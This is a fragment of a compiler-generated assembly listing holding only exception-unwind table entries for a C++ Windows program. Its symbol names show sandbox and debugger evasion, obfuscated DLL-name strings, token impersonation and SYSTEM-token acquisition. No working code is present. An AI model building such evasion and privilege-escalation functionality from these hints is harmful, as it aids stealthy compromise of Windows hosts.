	DD	imagerel $chain$6$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z DD imagerel ?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
	DD	imagerel ?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z+291
	DD	imagerel $unwind$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA DD imagerel ?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA
	DD	imagerel ?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA+38
	DD	imagerel $unwind$?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ DD imagerel $LN94
	DD	imagerel $LN94+115
	DD	imagerel $unwind$??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD imagerel $LN100
	DD	imagerel $LN100+115
	DD	imagerel $unwind$??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__F_loadedLibs@@YAXXZ DD imagerel ??__F_loadedLibs@@YAXXZ
	DD	imagerel ??__F_loadedLibs@@YAXXZ+129
	DD	imagerel $unwind$??__F_loadedLibs@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__E_loadedLibs@@YAXXZ DD imagerel ??__E_loadedLibs@@YAXXZ
	DD	imagerel ??__E_loadedLibs@@YAXXZ+119
	DD	imagerel $unwind$??__E_loadedLibs@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ DD imagerel ??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ
	DD	imagerel ??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ+101
	DD	imagerel $unwind$??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ DD imagerel ??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ
	DD	imagerel ??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ+170
	DD	imagerel $unwind$??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ DD imagerel $LN37
	DD	imagerel $LN37+96
	DD	imagerel $unwind$??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z DD imagerel $LN24
	DD	imagerel $LN24+52
	DD	imagerel $unwind$??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z DD imagerel $LN37
	DD	imagerel $LN37+114
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD imagerel $LN45
	DD	imagerel $LN45+133
	DD	imagerel $unwind$?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD imagerel $LN50
	DD	imagerel $LN50+19
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD imagerel $LN50+19
	DD	imagerel $LN50+128
	DD	imagerel $chain$0$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD imagerel $LN50+128
	DD	imagerel $LN50+134
	DD	imagerel $chain$1$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD imagerel $LN50+134
	DD	imagerel $LN50+146
	DD	imagerel $chain$2$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109+41
	DD	imagerel $LN109+198
	DD	imagerel $chain$1$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109+198
	DD	imagerel $LN109+199
	DD	imagerel $chain$2$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109+199
	DD	imagerel $LN109+205
	DD	imagerel $chain$3$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109+205
	DD	imagerel $LN109+211
	DD	imagerel $chain$4$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD imagerel $LN109+211
	DD	imagerel $LN109+217
	DD	imagerel $chain$5$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z DD imagerel $LN118
	DD	imagerel $LN118+264
	DD	imagerel $unwind$??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ DD imagerel ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ DD imagerel ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ+108
	DD	imagerel $unwind$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ DD imagerel ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Free@Data_t@_bstr_t@@AEAAXXZ DD imagerel $LN10
	DD	imagerel $LN10+58
	DD	imagerel $unwind$?_Free@Data_t@_bstr_t@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1Data_t@_bstr_t@@AEAA@XZ DD imagerel $LN13
	DD	imagerel $LN13+58
	DD	imagerel $unwind$??1Data_t@_bstr_t@@AEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetString@Data_t@_bstr_t@@QEBAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+36
	DD	imagerel $unwind$?GetString@Data_t@_bstr_t@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_GData_t@_bstr_t@@AEAAPEAXI@Z DD imagerel $LN17
	DD	imagerel $LN17+74
	DD	imagerel $unwind$??_GData_t@_bstr_t@@AEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Release@Data_t@_bstr_t@@QEAAKXZ DD imagerel $LN27
	DD	imagerel $LN27+102
	DD	imagerel $unwind$?Release@Data_t@_bstr_t@@QEAAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0Data_t@_bstr_t@@QEAA@PEB_W@Z DD imagerel $LN9
	DD	imagerel $LN9+78
	DD	imagerel $unwind$??0Data_t@_bstr_t@@QEAA@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Free@_bstr_t@@AEAAXXZ DD imagerel $LN29
	DD	imagerel $LN29+110
	DD	imagerel $unwind$?_Free@_bstr_t@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B_bstr_t@@QEBAPEBDXZ DD imagerel $LN11
	DD	imagerel $LN11+49
	DD	imagerel $unwind$??B_bstr_t@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_bstr_t@@QEAA@XZ DD imagerel $LN32
	DD	imagerel $LN32+110
	DD	imagerel $unwind$??1_bstr_t@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_bstr_t@@QEAA@PEB_W@Z DD imagerel $LN21
	DD	imagerel $LN21+142
	DD	imagerel $unwind$??0_bstr_t@@QEAA@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA DD imagerel ?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA
	DD	imagerel ?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA+29
	DD	imagerel $unwind$?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN453
	DD	imagerel $LN453+2186
	DD	imagerel $unwind$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+87
	DD	imagerel $unwind$?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+87
	DD	imagerel $unwind$?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+87
	DD	imagerel $unwind$?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+87
	DD	imagerel $unwind$?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DD imagerel $LN74
	DD	imagerel $LN74+438
	DD	imagerel $unwind$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA DD imagerel ?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA
	DD	imagerel ?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA+87
	DD	imagerel $unwind$?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckNoDebugger@ProcessUtilities@@YAHXZ DD imagerel $LN31
	DD	imagerel $LN31+259
	DD	imagerel $unwind$?CheckNoDebugger@ProcessUtilities@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA DD imagerel ?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA
	DD	imagerel ?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z DD imagerel $LN12
	DD	imagerel $LN12+276
	DD	imagerel $unwind$?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Init@ProcessUtilities@@YAHXZ DD imagerel $LN64
	DD	imagerel $LN64+525
	DD	imagerel $unwind$?Init@ProcessUtilities@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA DD imagerel ?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA
	DD	imagerel ?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA+87
	DD	imagerel $unwind$?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetSystemToken@ProcessUtilities@@YAPEAXXZ DD imagerel $LN90
	DD	imagerel $LN90+638
	DD	imagerel $unwind$?GetSystemToken@ProcessUtilities@@YAPEAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
